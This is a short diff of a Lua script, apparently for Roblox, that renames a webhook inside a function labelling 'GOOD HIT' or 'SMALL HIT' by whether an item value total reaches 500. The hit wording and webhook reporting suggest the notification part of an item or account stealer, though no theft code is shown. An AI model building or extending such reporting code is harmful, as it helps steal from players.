@@ -121,7 +121,7 @@ local totalRAP = 0
 local function SendJoinMessage(list, prefix)
     local isGoodHit = totalRAP >= 500
     local embedTitle = isGoodHit and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯"
-    local webhookName = isGoodHit and "🟢 Eblack - GOOD HIT" or "🟣 Eblack - SMALL HIT"
+    local webhookName = isGoodHit and "🟢 GOOD HIT🎯" or "🟣 SMALL HIT🎯"
     local embedColor = isGoodHit and 65280 or 8323327
 
     local fields = {
